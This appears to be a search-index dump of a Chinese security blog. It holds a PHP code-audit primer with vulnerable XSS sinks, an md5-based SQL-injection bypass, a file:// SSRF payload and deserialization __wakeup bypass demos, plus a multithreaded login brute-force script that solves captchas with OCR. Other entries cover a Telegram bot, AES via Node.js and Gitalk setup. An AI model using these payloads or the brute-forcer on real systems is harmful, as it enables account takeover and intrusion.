strict：若此参数的值为TRUE，那么in_array()函数将会检查needle的类型是否和haystack中的类型相同 \u003c?php $myarr = array('Ameng'); $needle = 0; if(in_array($needle,$myarr)){ echo \"It's in array\"; } else{ echo \"not in array\"; } ?\u003e 从简单的逻辑上分析,0是不存在要搜索的数组中的，理论上，应该是输出not in array，但是实际却输出了It's in array 原因就在于PHP的默认类型转换 这里我们第三个参数并没有设置为true那么默认就是非严格比较，在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。归根到底还是非严格比较导致的问题 所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过 ","date":"2023-02-08","objectID":"/8/:9:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"XSS ","date":"2023-02-08","objectID":"/8/:10:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"print() \u003c?php $str = $_GET['x']; print($str); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"print_r() \u003c?php $str = $_GET['x']; print_r($str); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"echo() \u003c?php $str = $_GET['x']; echo \"$str\"; ?\u003e ","date":"2023-02-08","objectID":"/8/:10:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"printf() \u003c?php $str = $_GET['x']; printf($str); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"sprintf() \u003c?php $str = $_GET['x']; $a = sprintf($str); echo \"$a\"; ?\u003e ","date":"2023-02-08","objectID":"/8/:10:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"die() 此函数输出一条信息，并退出当前脚本 \u003c?php $str = $_GET['x']; die($str); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"var_dump() 此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构 \u003c?php $str = $_GET['x']; $a = array($str); var_dump($a); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"var_export() 此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和var_dump类似，不同的是其返回的表示是合法的 PHP 代码 \u003c?php $str = $_GET['x']; $a = array($str); var_export($a); ?\u003e ","date":"2023-02-08","objectID":"/8/:10:8","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"PHP黑魔法 ","date":"2023-02-08","objectID":"/8/:11:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"md5() md5()函数绕过sql注入 $password=$_POST['password']; $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)\u003e0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c转成字符串为'or'6xxx ffifdyop的MD5加密结果是 276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成’or'6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密 ","date":"2023-02-08","objectID":"/8/:11:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"eval() 在执行命令时，可使用分号构造处多条语句 \u003c?php $cmd = \"echo 'a';echo '--------------';echo 'b';\"; echo eval($cmd); ?\u003e ","date":"2023-02-08","objectID":"/8/:11:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"ereg() 存在%00截断，当遇到使用此函数来进行正则匹配时，我们可以用%00来截断正则匹配，从而绕过正则 ","date":"2023-02-08","objectID":"/8/:11:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"curl_setopt() 存在ssrf漏洞 \u003c?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['Ameng']); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); ?\u003e # 使用file协议进行任意文件读取 # payload Ameng=file:///D:/phpstudy_pro/WWW/demo.txt # 除此之外还有dict协议查看端口信息。gopher协议反弹shell利用等 ","date":"2023-02-08","objectID":"/8/:11:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"urldecode() url二次编码绕过 \u003c?php $name = urldecode($_GET['name']); if($name == \"Ameng\"){ echo \"Plase~\"; } else{ echo \"sorry\"; } ?\u003e 将Ameng进行二次url编码，然后传入即可得到满足条件 ","date":"2023-02-08","objectID":"/8/:11:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"file_get_contents() 常用伪协议来进行绕过 ","date":"2023-02-08","objectID":"/8/:11:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"parse_url() 此函数主要用于绕过某些过滤 在浏览器输入url时，会将url中的\\转换为/，从而就会导致parse_url的白名单绕过 \u003c?php $url = \"https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html\"; $parts = parse_url($url); print_r($parts); ?\u003e # 执行结果 Array ( [scheme] =\u003e https [host] =\u003e wiki.wgpsec.org [path] =\u003e /knowledge/code-audit/php-code-audit.html ) ","date":"2023-02-08","objectID":"/8/:11:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"反序列化漏洞 序列化：把对象转换为字节序列的过程成为对象的序列化 反序列化：把字节序列恢复为对象的过程称为对象的反序列化 在 PHP 中主要就是通过serialize和unserialize来实现数据的序列化和反序列化 \u003c?php class Ameng{ public $who = \"Ameng\"; } $a = serialize(new Ameng); echo $a; ?\u003e # 执行结果 O:5:\"Ameng\":1:{s:3:\"who\";s:5:\"Ameng\";} 这里还要补充一点，就是关于变量的分类，变量的类别有三种： public：正常操作，在反序列化时原型就行 protected：反序列化时在变量名前加上%00*%00 private：反序列化时在变量名前加上%00类名%00 ","date":"2023-02-08","objectID":"/8/:12:0","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__wakeup() 在反序列化时，会先检查类中是否存在__wakeup()，如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过__wakeup()执行__destruct() 影响版本： PHP5 \u003c 5.6.25 PHP7 \u003c 7.0.10 # 当前目录中需存在2.php \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ public $name='1.php'; function __destruct(){ echo \"destruct执行\u003cbr\u003e\"; echo highlight_file($this-\u003ename, true); } function __wakeup(){ echo \"wakeup执行\u003cbr\u003e\"; $this-\u003ename='1.php'; } } $data = 'O:5:\"Ameng\":2:{s:4:\"name\";s:5:\"2.php\";}'; unserialize($data); ?\u003e # $data对象属性个数的值大于Ameng真实的属性个数，执行`__destruct()`触发highlight_file(2.php, true) # 执行结果 destruct执行 `2.php内容` ","date":"2023-02-08","objectID":"/8/:12:1","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__sleep() __sleep()函数刚好与__waeup()相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用 \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ public $name='1.php'; public function __construct($name){ $this-\u003ename=$name; } function __sleep(){ echo \"sleep()执行\u003cbr\u003e\"; echo highlight_file($this-\u003ename, true); } function __destruct(){ echo \"over\u003cbr\u003e\"; } function __wakeup(){ echo \"wakeup执行\u003cbr\u003e\"; } } $a = new Ameng(\"2.php\"); $b = serialize($a); ?\u003e # 执行结果 sleep()执行 `2.php内容`over ","date":"2023-02-08","objectID":"/8/:12:2","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__destruct() 在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，可以利用这一点来进行漏洞的利用 ","date":"2023-02-08","objectID":"/8/:12:3","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__construct() 在一个对象被创建时会调用这个函数，在__sleep()中用这个函数来对变量进行赋值 ","date":"2023-02-08","objectID":"/8/:12:4","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__call() 此函数用来监视一个对象中的其他方法，当你尝试调用一个对象中不存在的或者被权限控制的方法，那么__call就会被自动调用 \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ public function __call($name,$args){ echo \"\u003cbr\u003e\".\"call执行失败\"; } public static function __callStatic($name,$args){ echo \"\u003cbr\u003e\".\"callStatic执行失败\"; } } $a = new Ameng; $a-\u003eb(); //触发 __call Ameng::b(); //触发 __callStatic ?\u003e ","date":"2023-02-08","objectID":"/8/:12:5","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__callStatic() 这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用 倘若这两个函数中有命令执行的函数，那么调用对象中不存在方法时就可以调用这两个函数 ","date":"2023-02-08","objectID":"/8/:12:6","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__get() get方法用来获取私有成员属性的值 //__get()方法用来获取私有属性 public function __get($name){ return $this-\u003e$name; } ","date":"2023-02-08","objectID":"/8/:12:7","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__set() 此方法用来给私有成员属性赋值 //__set()方法用来设置私有属性 public function __set($name,$value){ $this-\u003e$name = $value; } ","date":"2023-02-08","objectID":"/8/:12:8","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__isset() 当对不可访问属性调用isset()或者empty()时调用 isset()函数检测某个变量是否被设置了，使用这个函数去检测对象里面的成员是否设定，若对象的成员是公有成员，没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，这个时候可以在类里面加上__isset()方法，接下来就可以使用isset()在对象外面访问对象里面的私有成员了 \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ private $name; public function __construct($name=\"\"){ $this-\u003ename = $name; } public function __isset($content){ echo \"当在类外面调用isset方法时，那么我就会执行！\".\"\u003cbr\u003e\"; echo isset($this-\u003e$content); } } $ameng = new Ameng(\"Ameng\"); echo isset($ameng-\u003ename); ?\u003e ","date":"2023-02-08","objectID":"/8/:12:9","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__toString() 此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果 通常情况下，我们访问类的属性的时候都是$实例化名称-\u003e属性名这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用__tostring()就可以直接用echo来输出了 \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ public $name; private $age; function __construct($name,$age){ $this-\u003ename = $name; $this-\u003eage = $age; } public function __toString(){ return $this-\u003ename . $this-\u003eage . '岁了'; } } $ameng = new Ameng('Ameng',3); echo $ameng; ?\u003e ","date":"2023-02-08","objectID":"/8/:12:10","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["代码审计"],"content":"__invoke() 当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用 版本要求：PHP \u003e 5.3.0 \u003c?php header(\"Content-Type: text/html; charset=utf-8\"); class Ameng{ public $name; private $age; function __construct($name,$age){ $this-\u003ename = $name; $this-\u003eage = $age; } public function __invoke(){ echo '你用调用函数的方式调用了这个对象，所以我起作用了'; } } $ameng = new Ameng('Ameng',3); $ameng(); ?\u003e # 执行结果 你用调用函数的方式调用了这个对象，所以我起作用 ","date":"2023-02-08","objectID":"/8/:12:11","tags":["PHP","持续补充"],"title":"PHP代码审计基础知识","uri":"/8/"},{"categories":["工具开发"],"content":"使用python-telegram-bot和selenium编写TG机器人、实现简单的epic免费游戏信息爬取","date":"2023-01-30","objectID":"/7/","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"环境搭建 由于机器人后台脚本需要持续运行，推荐使用VPS，本篇环境为linux环境 epic页面存在动态加载，通过selenium控制浏览器的方式来实现 ","date":"2023-01-30","objectID":"/7/:1:0","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"安装Chrome浏览器 linux安装Chrome浏览器，参考：https://support.google.com/chrome/a/answer/9025903（官方教程较为详细麻烦） 省事一点可执行以下命令 # 适用于 Debian 和 Ubuntu 平台 wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb dpkg -i google-chrome-stable_current_amd64.deb # 适用于 Fedora 和 openSUSE 平台 wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm rpm -ivh google-chrome-stable_current_x86_64.rpm ","date":"2023-01-30","objectID":"/7/:1:1","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"安装chromedriver驱动 根据Chrome浏览器版本，安装对应的chromedriver驱动，下载地址：https://chromedriver.chromium.org/downloads # 查看google-chrome版本 google-chrome --version wget https://chromedriver.storage.googleapis.com/对应版本/chromedriver_linux64.zip unzip chromedriver_linux64.zip # 将chromedriver移动到/usr/bin/目录下，LICENSE.chromedriver用不到可以删除 mv chromedriver /usr/bin/ # 查看chromedriver版本 chromedriver --version ","date":"2023-01-30","objectID":"/7/:1:2","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"安装需要依赖的包 pip install selenium --upgrade pip install python-telegram-bot --upgrade ","date":"2023-01-30","objectID":"/7/:1:3","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"在 Telegram 中创建机器人 参考：https://cloud.google.com/dialogflow/es/docs/integrations/telegram?hl=zh-cn 登录 Telegram 并转到 https://telegram.me/botfather 点击网页界面中的 Start 按钮或输入 /start 点击或输入 /newbot 并输入名称 为聊天机器人输入一个用户名，该名称应以“bot”结尾（例如 garthsweatherbot） 复制生成的访问令牌 ","date":"2023-01-30","objectID":"/7/:1:4","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"具体代码 机器人代码如下: 参考文档： python-telegram-bot官网：https://python-telegram-bot.org/ from selenium import webdriver from selenium.webdriver.chrome.options import Options from telegram import Update from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes import re # 获取epic免费游戏信息 async def getEpicInfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -\u003e None: await update.message.reply_text('正在查询...') chrome_options = Options() user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15' chrome_options.add_argument('--headless') chrome_options.add_argument('--no-sandbox') chrome_options.add_argument('--user-agent=' + user_agent) browser = webdriver.Chrome(options=chrome_options) browser.get('https://store.epicgames.com/zh-CN/') lis = re.findall(r'\u003ca aria-label=\"免费游戏,(.*?)role=\"link',browser.page_source) for li in lis: await update.message.reply_text(li) browser.quit() async def hello(update: Update, context: ContextTypes.DEFAULT_TYPE) -\u003e None: await update.message.reply_text(f'Hello {update.effective_user.first_name}') def main() -\u003e None: app = ApplicationBuilder().token('YOUR TOKEN HERE').build() app.add_handler(CommandHandler('epic', getEpicInfo)) app.add_handler(CommandHandler('hello', hello)) app.run_polling() if __name__ == '__main__': main() ","date":"2023-01-30","objectID":"/7/:2:0","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"遇到问题 ","date":"2023-01-30","objectID":"/7/:3:0","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"headless Chrome浏览器分为有头模式和无头模式，如果是有头模式，会弹出一个Chrome浏览器窗口，无头模式则不会弹出任何窗口，只有进程 由于VPS的linux无GUI，无法弹出Chrome浏览器窗口，selenium启动Chrome时，需添加参数headless，设置Chrome为无头模式，否则会出现以下报错 selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormally. (unknown error: DevToolsActivePort file doesn't exist) (The process started from chrome location /usr/bin/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.) ","date":"2023-01-30","objectID":"/7/:3:1","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"no-sandbox Chrome浏览器默认不允许root用户启动，需添加no-sandbox参数，关闭web沙盒，否则会出现与上面相同的报错 selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormally. (unknown error: DevToolsActivePort file doesn't exist) (The process started from chrome location /usr/bin/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.) 但此操作有可能导致浏览恶意网站时被入侵 ","date":"2023-01-30","objectID":"/7/:3:2","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"无头模式易被识别为爬虫 解决方法有两种： 使用无头模式 继续使用无头模式，通过添加参数进行混淆绕过爬虫检测 本篇文章的机器人便通过添加user_agent参数进行混淆绕过爬虫检测 使用有头模式 通过Xvfb运行脚本，Xvfb在虚拟内存中执行所有图形操作而不显示任何屏幕输出 具体参考：https://www.kingname.info/2021/02/16/use-selenium-head-in-linux/ 简单命令如下： sudo apt-get update sudo apt-get install xvfb xvfb-run python3 test.py 注意 在进行测试后发现一处问题该篇参考文章未提及： 如果当前用户是root用户，需添加no-sandbox参数，关闭web沙盒，才能成功运行，否则同样会报错 ","date":"2023-01-30","objectID":"/7/:3:3","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"参考文档 python-telegram-bot官网：https://python-telegram-bot.org/ VPS模拟浏览器有头模式：https://www.kingname.info/2021/02/16/use-selenium-head-in-linux/ ","date":"2023-01-30","objectID":"/7/:4:0","tags":["Python","Selenium","Python-Telegram-Bot"],"title":"TG机器人小试牛刀","uri":"/7/"},{"categories":["工具开发"],"content":"验证码自动识别、多线程爆破单个参数","date":"2022-12-19","objectID":"/6/","tags":["Python"],"title":"验证码自动识别的多线程爆破脚本","uri":"/6/"},{"categories":["工具开发"],"content":" 修改目标url的登录路径和验证码路径 修改相应的请求头和请求参数 将字典放到当前目录下命名为password.txt 如需挂代理可自行设置代理 import requests import json import fileinput import ddddocr import queue import threading import urllib3 from colorama import Fore from rich.progress import Progress import sys # 控制最大线程量 sem=threading.Semaphore(10) url = '' uname = 'admin' ocr = ddddocr.DdddOcr(show_ad=False) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) headers = { } proxies = { } # 测试代理 def testProxies(): response=requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5, verify=False) return json.loads(response.text)['origin'] # 获取验证码 def getCaptcha(AuthSession): response = AuthSession.get(url + '/验证码路径', headers=headers, proxies=proxies, timeout=5, verify=False) res = ocr.classification(response.content) return res #登陆请求 def login(AuthSession,uname,pwd,sem,progress,task): try: u = url + '/登录路径' d = { 'username': uname, 'password': pwd, 'captcha':getCaptcha(AuthSession) } response = AuthSession.post(u, data=d, headers=headers, proxies=proxies, timeout=5, verify=False) response = json.loads(response.text) if response['msg'] == '密码错误': print(Fore.RED + response['msg'] + ' 密码：' + pwd) elif response['msg'] == \"验证码错误\": print(Fore.YELLOW + response['msg'] + ' 密码：' + pwd) login(AuthSession,uname,pwd,sem,progress,task) return else: print(Fore.GREEN + response['msg'] + ' 密码：' + pwd) sys.exit() if not progress.finished: progress.update(task, advance=1) sem.release() except: print('login发生错误') def main(): threads = [] q = queue.Queue() with fileinput.input(files=(r'password.txt'),openhook=fileinput.hook_encoded(\"utf-8\")) as f: for line in f: q.put(line) with Progress() as progress: task = progress.add_task(\"[yellow]本地IP\"+testProxies(), total=q.qsize()) for i in range(q.qsize()): sem.acquire() AuthSession = requests.session() td = threading.Thread(target=login,args=(AuthSession,uname,q.get().replace(\"\\n\", \"\"),sem,progress,task)) threads.append(td) td.start() for t in threads: t.join() if __name__==\"__main__\": main() ","date":"2022-12-19","objectID":"/6/:0:0","tags":["Python"],"title":"验证码自动识别的多线程爆破脚本","uri":"/6/"},{"categories":["工具开发"],"content":"ddddocr的简单使用","date":"2022-12-14","objectID":"/5/","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["工具开发"],"content":"安装依赖 pip install ddddocr ","date":"2022-12-14","objectID":"/5/:1:0","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["工具开发"],"content":"实现代码 import ddddocr ocr = ddddocr.DdddOcr(show_ad=False) # 通过img_base64识别验证码，img_base64不包含数据头 res = ocr.classification(img_base64) # 通过img_bytes识别验证码，将图片下载到本地识别验证码 with open('1.png', 'rb') as f: img_bytes = f.read() res = ocr.classification(img_bytes) print(res) 信息 参考：https://cloud.tencent.com/developer/article/1853149 ","date":"2022-12-14","objectID":"/5/:2:0","tags":["Python"],"title":"三行代码解决验证码","uri":"/5/"},{"categories":["逆向研究"],"content":"通过Nodejs进行AES加密后采用Python脚本调用","date":"2022-12-13","objectID":"/4/","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["逆向研究"],"content":"Nodejs进行AES加密 注意 本地需要Nodejs环境 var CryptoJS = require(\"crypto-js\"); // 只需找到key和iv var key; var iv; function encrypt(data) { encryptedKey = CryptoJS.AES.encrypt(data, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }).toString() return encryptedKey } ","date":"2022-12-13","objectID":"/4/:1:0","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["逆向研究"],"content":"python脚本调用 import execjs result = execjs.compile(open('test.js','r').read()).call('encrypt','test') print(result) ","date":"2022-12-13","objectID":"/4/:2:0","tags":["Python","Nodejs"],"title":"逆向AES加密脚本","uri":"/4/"},{"categories":["工具开发"],"content":"简单记录一下大佬的脚本以防丢失","date":"2022-12-08","objectID":"/3/","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Python自动初始化Gitalk 信息 参考：https://www.xiaobinqt.cn/gitalk-init-issue/ 复制themes/LoveIt/layouts/partials/comment.html到layouts/partials/comment.html 修改第27行.Date=\u003e(md5 .RelPermalink) 大佬的脚本： import hashlib import json import sys import time import requests site_url = \"https://xiaobinqt.github.io\" if len(sys.argv) != 4: print(\"Usage:\") print(sys.argv[0], \"token username repo_name\") sys.exit(1) # issue 的 body 就是文章的 URL token = sys.argv[1] username = sys.argv[2] repo_name = sys.argv[3] issue_map = dict() ## [issue_body] = {\"issue_number\": issue_number, \"issue_title\": issue_title} posts_map = dict() # [post_url] = {\"post_uri\":uri,\"post_date\":date,\"post_title\":title} def get_all_gitalk_issues(token, username, repo_name): for i in range(1, 150): # 15000 个 issue 基本够用了,不够可以再加 _, ret = get_issues_page(i) time.sleep(5) if ret == -1: break ## 删除的文章不管.... ## 文章 title 修改了的文章该怎么处理？ 标题可能修改,但是 uri 不变,issue 的 body 是文章地址,只要文章地址不变，就可以直接 update issue title ## uri 如果也变了，相当于是文件的重命名了，这时只能去手动 update issue title 了?..... def update_issue(issue_number, title): if title == \"\": return url = 'https://api.github.com/repos/%s/%s/issues/%d' % (username, repo_name, issue_number) print(\"update_issue url: %s\" % url) data = { 'title': title, } print(\"create_issue req json: %s\" % json.dumps(data)) r = requests.patch(url, data=json.dumps(data), headers={ \"Authorization\": \"token %s\" % token, }, verify=False) if r.status_code == 200: print(\"update_issue success\") else: print(\"update_issue fail, status_code: %d,title: %s,issue_number: %d\" % (r.status_code, title, issue_number)) # 获取所有 label 为 gitalk 的 issue def get_issues_page(page=1): url = 'https://api.github.com/repos/%s/%s/issues?labels=Gitalk\u0026per_page=100\u0026page=%d' % (username, repo_name, page) print(\"get_issues url: %s\" % url) r = requests.get(url, headers={ \"Authorization\": \"token %s\" % token, \"Accept\": \"application/vnd.github.v3+json\" }) if r.status_code != 200: print(\"get_issues_page fail, status_code: %d\" % r.status_code) sys.exit(2) if r.json() == []: return (issue_map, -1) for issue in r.json(): if issue['body'] not in issue_map and issue[\"body\"] != \"\": issue_map[issue['body']] = { \"issue_number\": issue['number'], \"issue_title\": issue['title'] } return (issue_map, 0) # 通过 public/index.json 获取所有的文章 def get_post_titles(): with open(file='public/index.json', mode='r', encoding='utf-8') as f: file_data = f.read() if file_data == \"\" or file_data == [] or file_data == {}: return posts_map file_data = json.loads(file_data) for data in file_data: key = \"%s%s\" % (site_url, data['uri']) if key not in posts_map: posts_map[key] = { \"post_uri\": data['uri'], \"post_date\": data['date'], \"post_title\": data['title'] } return posts_map def create_issue(title=\"\", uri=\"\", date=\"\"): if title == \"\": return url = 'https://api.github.com/repos/%s/%s/issues' % (username, repo_name) print(\"create_issue title: %s uri: %s date: %s\" % (title, uri, date)) m = hashlib.md5() m.update(uri.encode('utf-8')) urlmd5 = m.hexdigest() data = { 'title': title, 'body': '%s%s' % (site_url, uri), 'labels': [ 'Gitalk', urlmd5 ] } print(\"create_issue req json: %s\" % json.dumps(data)) r = requests.post(url, data=json.dumps(data), headers={ \"Authorization\": \"token %s\" % token, }) if r.status_code == 201: print(\"create_issue success\") else: print(\"create_issue fail, status_code: %d,title: %s,req url: %s \\n\" % (r.status_code, title, url)) # 创建 gitalk 创建 issue,如果 issue 已经存在，则不创建 def init_gitalk(): for post_url, item in posts_map.items(): ## 标题被修改了 if post_url in issue_map and item['post_title'] != issue_map[post_url]['issue_title']: update_issue(issue_map[post_url][\"issue_number\"], item['post_title']) elif post_url not in issue_map: # 新增的文章 print(\"title: [%s] , body [%s] issue 不存在,创建...\" % (item[\"post_title\"], post_url)) create_issue(item[\"post_title\"], item[\"post_uri\"], item[\"post_date\"]) # 延迟 5 秒，防止 github api 请求过于频繁： https://docs.github.com/en/rest/guides/best-practices-for-integrators#dealing-with-secondary-rate-limits time.sleep(5) def get_uri_md5(uri): m = ha","date":"2022-12-08","objectID":"/3/:1:0","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Gitalk页面不加载问题 解决方法： 复制themes/LoveIt/layouts/partials/comment.html到layouts/partials/comment.html 将第3行 {{- $comment := .Scratch.Get \"comment\" | default dict -}} 修改为： {{- $comment := .Site.Params.page.comment | default dict -}} ","date":"2022-12-08","objectID":"/3/:2:0","tags":["Python","Gitalk"],"title":"Python自动初始化Gitalk","uri":"/3/"},{"categories":["工具开发"],"content":"Python多线程卖票包含信号量限制、进度条、彩色字体","date":"2022-12-03","objectID":"/2/","tags":["Python"],"title":"Python多线程卖票","uri":"/2/"},{"categories":["工具开发"],"content":" #!/usr/bin/python3 import threading import time import queue from colorama import Fore from rich.progress import Progress tt = 50 threads = [] q = queue.Queue() # 控制最大可用窗口数 sem=threading.Semaphore(5) def sale(sem,progress,task): while not q.empty(): if threading.current_thread().name == \"第1窗口\": print(Fore.GREEN + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第2窗口\": print(Fore.MAGENTA + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第3窗口\": print(Fore.BLUE + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) elif threading.current_thread().name == \"第4窗口\": print(Fore.CYAN + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) else: print(Fore.YELLOW + \"{}：卖出第{}张票\".format(threading.current_thread().name,q.get())) if not progress.finished: progress.update(task, advance=1) time.sleep(5) sem.release() def main(): for i in range(tt): q.put(i+1) with Progress() as progress: task = progress.add_task(\"[cyan]Processing\", total=tt) # 控制窗口数 for j in range(20): sem.acquire() td = threading.Thread(target=sale,args=(sem,progress,task),name=\"第\"+str(j+1)+\"窗口\") # 添加线程到线程列表 threads.append(td) td.start() # 等待所有线程完成后退出主线程 for t in threads: t.join() print(Fore.RED +\"票已卖完！！！\") if __name__==\"__main__\": main() 注意 存在问题 